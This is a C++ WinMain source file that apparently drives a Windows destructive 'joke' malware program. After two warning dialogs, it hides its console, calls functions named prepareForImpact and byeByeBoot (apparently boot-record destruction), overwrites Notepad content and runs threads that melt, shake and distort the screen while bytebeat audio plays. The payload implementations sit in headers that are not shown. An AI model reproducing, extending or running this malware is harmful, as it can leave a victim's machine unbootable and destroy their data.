#include "visual_payloads.h"
#include "payloads.h"
#include "bytebeats.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
	
	HANDLE t1, t2, t3, t4;
	
	ShowWindow(GetConsoleWindow(), 0);
	
	if(MessageBox(NULL, "Running this software may result in data destruction, system malfunction, and possible nuclear war. Are you completely sure you want to proceed?", "Warning!", MB_YESNO | MB_ICONWARNING) == 6){
		if (MessageBox(NULL, "This is the last warning! Do you want to proceed with the execution?", "You have been warned [...]", MB_YESNO | MB_ICONEXCLAMATION) == 6){
			
			Payloads::prepareForImpact();
			
			switch (Payloads::whatDayIsToday()){
				case 1:
					MessageBox(NULL, "Just a normal day [...]", "Goodbye.", MB_OK | MB_ICONINFORMATION);
					PlaySound(MAKEINTRESOURCE(2), hInstance, SND_RESOURCE);
					ExitProcess(0);
				case 2:
					Payloads::byeByeBoot();
					break;
				case 3:
					ExitProcess(0);
			}
		
			PlaySound(MAKEINTRESOURCE(69), hInstance, SND_RESOURCE);
			

			t1 = CreateThread(NULL, 0, VisualPayloads::crazyIcons, NULL, 0, NULL);
			t2 = CreateThread(NULL, 0, VisualPayloads::crazyMouse, NULL, 0, NULL);
			Payloads::notepadOverwriter();
			
			
			TerminateThread(t1, 0);
			TerminateThread(t2, 0);
			
			
			t1 = CreateThread(NULL, 0, VisualPayloads::meltingScreen, NULL, 0, NULL);
			Bytebeat::beat1();
			
			t2 = CreateThread(NULL, 0, VisualPayloads::hatingTexts, NULL, 0, NULL);
			Bytebeat::beat2();
			
			t3 = CreateThread(NULL, 0, VisualPayloads::screenShaker, NULL, 0, NULL);
			Bytebeat::beat3();
			
			t4 = CreateThread(NULL, 0, VisualPayloads::hypnosis, NULL, 0, NULL);
			Bytebeat::beat4();
			
			
			TerminateThread(t1, 0);
			TerminateThread(t2, 0);
			TerminateThread(t3, 0);
			TerminateThread(t4, 0);
			
			
			t1 = CreateThread(NULL, 0, VisualPayloads::brilhoso, NULL, 0, NULL);
			Bytebeat::beat5();
			
			t2 = CreateThread(NULL, 0, VisualPayloads::garbage, NULL, 0, NULL);
			Bytebeat::beat6();
			
			t3 = CreateThread(NULL, 0, VisualPayloads::zoom, NULL, 0, NULL);
			Bytebeat::beat7();
			
			TerminateThread(t3, 0);
			
			t4 = CreateThread(NULL, 0, VisualPayloads::puzzle, NULL, 0, NULL);
			Bytebeat::beat8();
			
			
			TerminateThread(t1, 0);
			TerminateThread(t2, 0);
			TerminateThread(t4, 0);
		}
	}
	
	return 0;
}